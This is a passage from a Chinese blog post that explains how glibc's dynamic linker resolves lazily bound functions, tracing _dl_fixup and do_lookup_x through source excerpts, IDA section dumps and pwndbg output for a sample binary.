(<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// /elf/dl-runtime.c, line 34</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PLTREL  ElfW(Rela)</span></span><br></pre></td></tr></table></figure>
<p><code>__ELF_NATIVE_CLASS</code>为64，因此第一条语句即为获取ELF的.symtab节地址，即符号表地址。具体的获取方式如下：</p>
<p>在ELF中有.dynamic节，其中保存有本ELF文件多个节的地址信息：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000003DF8                               LOAD segment mempage public &#x27;DATA&#x27; use64</span><br><span class="line">LOAD:0000000000003DF8                               assume cs:LOAD</span><br><span class="line">LOAD:0000000000003DF8                               ;org 3DF8h</span><br><span class="line">LOAD:0000000000003DF8 01 00 00 00 00 00 00 00 01 00+stru_3DF8 Elf64_Dyn &lt;1, 1&gt;              ; DATA XREF: LOAD:00000000000001A0↑o</span><br><span class="line">LOAD:0000000000003DF8 00 00 00 00 00 00                                                     ; .got.plt:0000000000004000↓o</span><br><span class="line">LOAD:0000000000003DF8                                                                       ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:0000000000003E08 0C 00 00 00 00 00 00 00 00 10+Elf64_Dyn &lt;0Ch, 1000h&gt;                  ; DT_INIT</span><br><span class="line">LOAD:0000000000003E18 0D 00 00 00 00 00 00 00 E8 12+Elf64_Dyn &lt;0Dh, 12E8h&gt;                  ; DT_FINI</span><br><span class="line">LOAD:0000000000003E28 19 00 00 00 00 00 00 00 E0 3D+Elf64_Dyn &lt;19h, 3DE0h&gt;                  ; DT_INIT_ARRAY</span><br><span class="line">LOAD:0000000000003E38 1B 00 00 00 00 00 00 00 10 00+Elf64_Dyn &lt;1Bh, 10h&gt;                    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:0000000000003E48 1A 00 00 00 00 00 00 00 F0 3D+Elf64_Dyn &lt;1Ah, 3DF0h&gt;                  ; DT_FINI_ARRAY</span><br><span class="line">LOAD:0000000000003E58 1C 00 00 00 00 00 00 00 08 00+Elf64_Dyn &lt;1Ch, 8&gt;                      ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:0000000000003E68 F5 FE FF 6F 00 00 00 00 A0 03+Elf64_Dyn &lt;6FFFFEF5h, 3A0h&gt;             ; DT_GNU_HASH</span><br><span class="line">LOAD:0000000000003E78 05 00 00 00 00 00 00 00 B8 04+Elf64_Dyn &lt;5, 4B8h&gt;                     ; DT_STRTAB</span><br><span class="line">LOAD:0000000000003E88 06 00 00 00 00 00 00 00 C8 03+dq 6                                    ; d_tag ; DT_SYMTAB</span><br><span class="line">LOAD:0000000000003E88 00 00 00 00 00 00             dq 3C8h                                 ; d_un</span><br><span class="line">LOAD:0000000000003E98 0A 00 00 00 00 00 00 00 95 00+Elf64_Dyn &lt;0Ah, 95h&gt;                    ; DT_STRSZ</span><br><span class="line">LOAD:0000000000003EA8 0B 00 00 00 00 00 00 00 18 00+Elf64_Dyn &lt;0Bh, 18h&gt;                    ; DT_SYMENT</span><br><span class="line">LOAD:0000000000003EB8 15 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;15h, 0&gt;                      ; DT_DEBUG</span><br><span class="line">LOAD:0000000000003EC8 03 00 00 00 00 00 00 00 00 40+Elf64_Dyn &lt;3, 4000h&gt;                    ; DT_PLTGOT</span><br><span class="line">LOAD:0000000000003ED8 02 00 00 00 00 00 00 00 60 00+Elf64_Dyn &lt;2, 60h&gt;                      ; DT_PLTRELSZ</span><br><span class="line">LOAD:0000000000003EE8 14 00 00 00 00 00 00 00 07 00+Elf64_Dyn &lt;14h, 7&gt;                      ; DT_PLTREL</span><br><span class="line">LOAD:0000000000003EF8 17 00 00 00 00 00 00 00 60 06+Elf64_Dyn &lt;17h, 660h&gt;                   ; DT_JMPREL</span><br><span class="line">LOAD:0000000000003F08 07 00 00 00 00 00 00 00 88 05+Elf64_Dyn &lt;7, 588h&gt;                     ; DT_RELA</span><br><span class="line">LOAD:0000000000003F18 08 00 00 00 00 00 00 00 D8 00+Elf64_Dyn &lt;8, 0D8h&gt;                     ; DT_RELASZ</span><br><span class="line">LOAD:0000000000003F28 09 00 00 00 00 00 00 00 18 00+Elf64_Dyn &lt;9, 18h&gt;                      ; DT_RELAENT</span><br><span class="line">LOAD:0000000000003F38 FB FF FF 6F 00 00 00 00 00 00+Elf64_Dyn &lt;6FFFFFFBh, 8000000h&gt;         ; DT_FLAGS_1</span><br><span class="line">LOAD:0000000000003F48 FE FF FF 6F 00 00 00 00 68 05+Elf64_Dyn &lt;6FFFFFFEh, 568h&gt;             ; DT_VERNEED</span><br><span class="line">LOAD:0000000000003F58 FF FF FF 6F 00 00 00 00 01 00+Elf64_Dyn &lt;6FFFFFFFh, 1&gt;                ; DT_VERNEEDNUM</span><br><span class="line">LOAD:0000000000003F68 F0 FF FF 6F 00 00 00 00 4E 05+Elf64_Dyn &lt;6FFFFFF0h, 54Eh&gt;             ; DT_VERSYM</span><br><span class="line">LOAD:0000000000003F78 F9 FF FF 6F 00 00 00 00 04 00+Elf64_Dyn &lt;6FFFFFF9h, 4&gt;                ; DT_RELACOUNT</span><br><span class="line">LOAD:0000000000003F88 00 00 00 00 00 00 00 00 00 00+Elf64_Dyn &lt;0&gt;                           ; DT_NULL</span><br></pre></td></tr></table></figure>
<p>如上例所示，dynamic节实际上是由多个二元组构成，二元组的第一个元素为编号，用于标识表示的内容，如这里的5即代表.strtab节，即字符串表节的相对地址、6即代表.symtab节，即符号表的相对地址。所有这些常量定义在/elf/elf.h中。因此前面3条语句实际上是在获取ELF文件的<strong>符号表实例、字符串表实例、PLT相对跳转表（.rela.plt节）实例</strong>。</p>
<p>第4行<code>const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</code>是要根据.rela.plt中对应函数的<code>r_info</code>字段获取到.symtab符号表中的对应项：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000000660                               ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:0000000000000660 18 40 00 00 00 00 00 00 07 00+dq 4018h                                ; r_offset ; R_X86_64_JUMP_SLOT write</span><br><span class="line">LOAD:0000000000000660 00 00 02 00 00 00 00 00 00 00+dq 200000007h                           ; r_info</span><br><span class="line">LOAD:0000000000000660 00 00 00 00                   dq 0                                    ; r_addend</span><br><span class="line">LOAD:0000000000000678 20 40 00 00 00 00 00 00 07 00+dq 4020h                                ; r_offset ; R_X86_64_JUMP_SLOT read</span><br><span class="line">LOAD:0000000000000678 00 00 03 00 00 00 00 00 00 00+dq 300000007h                           ; r_info</span><br><span class="line">LOAD:0000000000000678 00 00 00 00                   dq 0                                    ; r_addend</span><br><span class="line">LOAD:0000000000000690 28 40 00 00 00 00 00 00 07 00+dq 4028h                                ; r_offset ; R_X86_64_JUMP_SLOT malloc</span><br><span class="line">LOAD:0000000000000690 00 00 06 00 00 00 00 00 00 00+dq 600000007h                           ; r_info</span><br><span class="line">LOAD:0000000000000690 00 00 00 00                   dq 0                                    ; r_addend</span><br><span class="line">LOAD:00000000000006A8 30 40 00 00 00 00 00 00 07 00+dq 4030h                                ; r_offset ; R_X86_64_JUMP_SLOT _Exit</span><br><span class="line">LOAD:00000000000006A8 00 00 08 00 00 00 00 00 00 00+dq 800000007h                           ; r_info</span><br><span class="line">LOAD:00000000000006A8 00 00 00 00                   dq 0                                    ; r_addend</span><br></pre></td></tr></table></figure>
<p>如上例所示，这里是取<code>r_info</code>的高4字节，对于<code>read</code>为3，随后到符号表中查找：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LOAD:00000000000003C8 00 00 00 00 00 00 00 00 00 00+Elf64_Sym &lt;0&gt;</span><br><span class="line">LOAD:00000000000003E0 50 00 00 00 20 00 00 00 00 00+Elf64_Sym &lt;offset aItmDeregistert - offset unk_4B8, 20h, 0, 0, offset dword_0, 0&gt; ; &quot;_ITM_deregisterTMCloneTable&quot;</span><br><span class="line">LOAD:00000000000003F8 3E 00 00 00 12 00 00 00 00 00+Elf64_Sym &lt;offset aWrite - offset unk_4B8, 12h, 0, 0, offset dword_0, 0&gt; ; &quot;write&quot;</span><br><span class="line">LOAD:0000000000000410 0B 00 00 00 12 00 00 00 00 00+Elf64_Sym &lt;offset aRead - offset unk_4B8, 12h, 0, 0, offset dword_0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:0000000000000428 2C 00 00 00 12 00 00 00 00 00+Elf64_Sym &lt;offset aLibcStartMain - offset unk_4B8, 12h, 0, 0, offset dword_0, 0&gt; ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:0000000000000440 6C 00 00 00 20 00 00 00 00 00+Elf64_Sym &lt;offset aGmonStart - offset unk_4B8, 20h, 0, 0, offset dword_0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:0000000000000458 10 00 00 00 12 00 00 00 00 00+Elf64_Sym &lt;offset aMalloc - offset unk_4B8, 12h, 0, 0, offset dword_0, 0&gt; ; &quot;malloc&quot;</span><br><span class="line">LOAD:0000000000000470 7B 00 00 00 20 00 00 00 00 00+Elf64_Sym &lt;offset aItmRegistertmc - offset unk_4B8, 20h, 0, 0, offset dword_0, 0&gt; ; &quot;_ITM_registerTMCloneTable&quot;</span><br><span class="line">LOAD:0000000000000488 17 00 00 00 12 00 00 00 00 00+Elf64_Sym &lt;offset aExit - offset unk_4B8, 12h, 0, 0, offset dword_0, 0&gt; ; &quot;_Exit&quot;</span><br><span class="line">LOAD:00000000000004A0 1D 00 00 00 22 00 00 00 00 00+Elf64_Sym &lt;offset aCxaFinalize - offset unk_4B8, 22h, 0, 0, offset dword_0, 0&gt; ; &quot;__cxa_finalize&quot;</span><br></pre></td></tr></table></figure>
<p>可以看到，索引为3的表项正是<code>read</code>。</p>
<p>第5行<code>void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);</code>即为获取函数的got表（.got.plt节）项地址。</p>
<h3 id="_dl_fixup第二段"><a class="markdownIt-Anchor" href="#_dl_fixup第二段"></a> <code>_dl_fixup</code>第二段</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">    (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">     <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">     <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的if判断条件中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /elf/elf.h, line 620</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_VISIBILITY(o)	((o) &amp; 0x03)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For ELF64 the definitions are the same.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_ST_VISIBILITY(o)	ELF32_ST_VISIBILITY (o)</span></span><br></pre></td></tr></table></figure>
<p>这里是与符号表项的<code>st_other</code>字段相关的判断。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /sysdeps/generic/ldsodefs.h, line 44</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VERSYMIDX(sym)	(DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGIDX (sym))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /elf/elf.h, line 887</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	DT_NUM		35		<span class="comment">/* Number used */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /sysdeps/generic/dl-dtprocnum.h, line 21</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_THISPROCNUM	0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /elf/elf.h, line 949</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	DT_VERNEEDNUM	0x6fffffff	<span class="comment">/* Number of needed versions */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_VERSIONTAGIDX(tag)	(DT_VERNEEDNUM - (tag))	<span class="comment">/* Reverse order! */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /elf/elf.h, line 937</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_VERSYM	0x6ffffff0</span></span><br></pre></td></tr></table></figure>
<p>内部的第一个判断与版本有关。根据上面的宏定义，我们要找的.dynamic表项索引应为<code>35 + 0 + (0x6fffffff - 0x6ffffff0) = 0x32</code>，这里的<code>ElfW(Half)</code>等同于<code>uint16_t</code>。最终获取到的<code>vernum</code>为指向.gnu.version节的指针：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">LOAD:000000000000054E                               ; ELF GNU Symbol Version Table</span><br><span class="line">LOAD:000000000000054E 00 00                         dw 0</span><br><span class="line">LOAD:0000000000000550 00 00                         dw 0                                    ; local  symbol: _ITM_deregisterTMCloneTable</span><br><span class="line">LOAD:0000000000000552 02 00                         dw 2                                    ; write@@GLIBC_2.2.5</span><br><span class="line">LOAD:0000000000000554 02 00                         dw 2                                    ; read@@GLIBC_2.2.5</span><br><span class="line">LOAD:0000000000000556 02 00                         dw 2                                    ; __libc_start_main@@GLIBC_2.2.5</span><br><span class="line">LOAD:0000000000000558 00 00                         dw 0                                    ; local  symbol: __gmon_start__</span><br><span class="line">LOAD:000000000000055A 02 00                         dw 2                                    ; malloc@@GLIBC_2.2.5</span><br><span class="line">LOAD:000000000000055C 00 00                         dw 0                                    ; local  symbol: _ITM_registerTMCloneTable</span><br><span class="line">LOAD:000000000000055E 02 00                         dw 2                                    ; _Exit@@GLIBC_2.2.5</span><br><span class="line">LOAD:0000000000000560 02 00                         dw 2                                    ; __cxa_finalize@@GLIBC_2.2.5</span><br><span class="line">LOAD:0000000000000562 00 00                         dw 0</span><br><span class="line">LOAD:0000000000000564 00 00                         dw 0</span><br><span class="line">LOAD:0000000000000566 00 00                         dw 0</span><br></pre></td></tr></table></figure>
<p>随后代码根据.relo.plt记录的索引值，找到.gnu.version节的对应值，对于<code>read</code>而言，这里获取的是2。之后会找到一个ld.so中的结构，其中记录有支持的libc版本与hash值等信息：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7ffff7fbb6b0</span><br><span class="line">00:0000│  0x7ffff7fbb6b0 ◂— 0</span><br><span class="line">... ↓     5 skipped</span><br><span class="line">06:0030│  0x7ffff7fbb6e0 —▸ 0x5555555544fc ◂— &#x27;GLIBC_2.2.5&#x27;</span><br><span class="line">07:0038│  0x7ffff7fbb6e8 ◂— 0x9691a75</span><br><span class="line">pwndbg&gt; </span><br><span class="line">08:0040│  0x7ffff7fbb6f0 —▸ 0x5555555544b9 ◂— &#x27;libc.so.6&#x27;</span><br><span class="line">09:0048│  0x7ffff7fbb6f8 ◂— 0</span><br><span class="line">... ↓     6 skipped</span><br><span class="line">pwndbg&gt; </span><br><span class="line">10:0080│  0x7ffff7fbb730 —▸ 0x7ffff7fc1381 ◂— push rbp /* &#x27;LINUX_2.6&#x27; */</span><br><span class="line">11:0088│  0x7ffff7fbb738 ◂— 0x3ae75f6</span><br><span class="line">12:0090│  0x7ffff7fbb740 ◂— 0</span><br><span class="line">... ↓     5 skipped</span><br><span class="line">pwndbg&gt; </span><br><span class="line">18:00c0│  0x7ffff7fbb770 ◂— 0</span><br><span class="line">19:00c8│  0x7ffff7fbb778 ◂— 0</span><br><span class="line">1a:00d0│  0x7ffff7fbb780 —▸ 0x7ffff7d963d8 ◂— &#x27;GLIBC_2.2.5&#x27;</span><br><span class="line">1b:00d8│  0x7ffff7fbb788 ◂— 0x9691a75</span><br><span class="line">1c:00e0│  0x7ffff7fbb790 ◂— 0</span><br><span class="line">1d:00e8│  0x7ffff7fbb798 —▸ 0x7ffff7d963e4 ◂— &#x27;GLIBC_2.2.6&#x27;</span><br><span class="line">1e:00f0│  0x7ffff7fbb7a0 ◂— 0x9691a76</span><br><span class="line">1f:00f8│  0x7ffff7fbb7a8 ◂— 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>因此这里获取的Hash值为0x9691a75。</p>
<p>下面的第二个if与多线程有关，这里忽略。</p>
<h3 id="_dl_fixup第三段"><a class="markdownIt-Anchor" href="#_dl_fixup第三段"></a> <code>_dl_fixup</code>第三段</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>下面，就是真正的查找函数位置的流程。这里第1个参数为函数名在.strtab节中的偏移。</p>
<p>为了提升查询速度，ld.so不可能通过遍历所有动态链接库的所有函数名的方式查找匹配，在<code>_dl_lookup_symbol_x</code>中我们就能够窥见一二。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /elf/dl-lookup.c, line 842</span></span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">uint_fast32_t</span> new_hash = dl_new_hash (undef_name);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> old_hash = <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sym_val</span> <span class="title">current_value</span> =</span> &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> **<span class="title">scope</span> =</span> symbol_scope;</span><br><span class="line">    </span><br><span class="line">    bump_num_relocations ();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* DL_LOOKUP_RETURN_NEWEST does not make sense for versioned</span></span><br><span class="line"><span class="comment">       lookups.  */</span></span><br><span class="line">    assert (version == <span class="literal">NULL</span> || !(flags &amp; DL_LOOKUP_RETURN_NEWEST));</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (skip_map != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="comment">/* Search the relevant loaded objects for a definition.  */</span></span><br><span class="line">    <span class="keyword">while</span> ((*scope)-&gt;r_list[i] != skip_map)</span><br><span class="line">    ++i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Search the relevant loaded objects for a definition.  */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> start = i; *scope != <span class="literal">NULL</span>; start = <span class="number">0</span>, ++scope)</span><br><span class="line">    <span class="keyword">if</span> (do_lookup_x (undef_name, new_hash, &amp;old_hash, *ref,</span><br><span class="line">		     &amp;current_value, *scope, start, version, flags,</span><br><span class="line">		     skip_map, type_class, undef_map) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /elf/dl-lookup.c, line 578</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint_fast32_t</span></span><br><span class="line"><span class="title function_">dl_new_hash</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint_fast32_t</span> h = <span class="number">5381</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> c = *s; c != <span class="string">&#x27;\0&#x27;</span>; c = *++s)</span><br><span class="line">h = h * <span class="number">33</span> + c;</span><br><span class="line"><span class="keyword">return</span> h &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如上所示，ld.so实现了一个简单的哈希函数，输入为函数名，输出为int类型的哈希值，保存于<code>new_hash</code>变量中。随后看到<code>do_lookup_x</code>函数。</p>
<p>考虑到系统自带的libc与ld.so符号不全，因此可以重新编译带有所有符号的libc与ld.so辅助分析。编译方法见<a target="_blank" rel="noopener" href="https://blog.csdn.net/astrotycoon/article/details/52662685">传送门</a>。编译完成后执行下面的命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter &lt;安装目录&gt;/lib/ld-linux-x86-64.so.2 pwn</span><br><span class="line">patchelf --set-rpath &lt;安装目录&gt;/lib pwn</span><br></pre></td></tr></table></figure>
<p>即可将ld.so与libc.so替换为我们编译的带有调试符号的版本。</p>
<h3 id="do_lookup_x第一段"><a class="markdownIt-Anchor" href="#do_lookup_x第一段"></a> <code>do_lookup_x</code>第一段</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /elf/dl-lookup.c, line 361</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">__attribute_noinline__</span><br><span class="line"><span class="title function_">do_lookup_x</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *undef_name, <span class="type">uint_fast32_t</span> new_hash,</span></span><br><span class="line"><span class="params">	     <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> *old_hash, <span class="type">const</span> ElfW(Sym) *ref,</span></span><br><span class="line"><span class="params">	     <span class="keyword">struct</span> sym_val *result, <span class="keyword">struct</span> r_scope_elem *scope, <span class="type">size_t</span> i,</span></span><br><span class="line"><span class="params">	     <span class="type">const</span> <span class="keyword">struct</span> r_found_version *<span class="type">const</span> version, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">	     <span class="keyword">struct</span> link_map *skip, <span class="type">int</span> type_class, <span class="keyword">struct</span> link_map *undef_map)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> n = scope-&gt;r_nlist;</span><br><span class="line">  <span class="comment">/* Make sure we read the value before proceeding.  Otherwise we</span></span><br><span class="line"><span class="comment">     might use r_list pointing to the initial scope and r_nlist being</span></span><br><span class="line"><span class="comment">     the value after a resize.  That is the only path in dl-open.c not</span></span><br><span class="line"><span class="comment">     protected by GSCOPE.  A read barrier here might be to expensive.  */</span></span><br><span class="line">  __asm <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;&quot;</span> : <span class="string">&quot;+r&quot;</span> (n), <span class="string">&quot;+m&quot;</span> (scope-&gt;r_list))</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> **<span class="title">list</span> =</span> scope-&gt;r_list;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span> =</span> <span class="built_in">list</span>[i]-&gt;l_real;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">while</span> (++i &lt; n);</span><br></pre></td></tr></table></figure>
<p>在该函数开头，通过<code>scope</code>变量可以获取前文中提到的所有动态链接库的<code>link_map</code>结构实例（<code>scope-&gt;r_list</code>指向<code>link_map</code>结构指针的数组）。在do-while循环中，我们将看到ld.so遍历所有的实例，尝试在所有动态链接库中查找<code>undef_name</code>这个符号（函数名、全局变量等）。</p>
